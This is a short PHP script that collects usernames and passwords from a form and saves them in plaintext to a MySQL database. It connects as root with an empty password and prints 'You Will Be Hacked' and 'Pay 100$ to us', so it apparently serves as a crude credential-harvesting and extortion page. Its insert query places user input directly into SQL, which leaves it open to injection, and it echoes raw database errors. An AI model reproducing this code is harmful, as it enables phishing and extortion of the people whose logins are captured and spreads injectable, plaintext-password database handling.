<?php
$User_name=$_POST['User_name'];
$User_password=$_POST['User_password'];

define('HOST' , 'localhost');
define('DB_USER_NAME', 'root');
define('DB_USER_PASSWORD','');
define('DB_NAME','logindata');
$DB_connection=mysqli_connect(HOST,DB_USER_NAME,DB_USER_PASSWORD,DB_NAME);
if($DB_connection)
{
    echo "You Will Be Hacked";
}
$qry = "INSERT INTO data(User_name,User_password) VALUES ('$User_name', '$User_password')";
$save = mysqli_query($DB_connection, $qry);

if($save){
    echo 'Pay 100$ to us ';
}
else{
    echo mysqli_error($DB_connection);
}

?>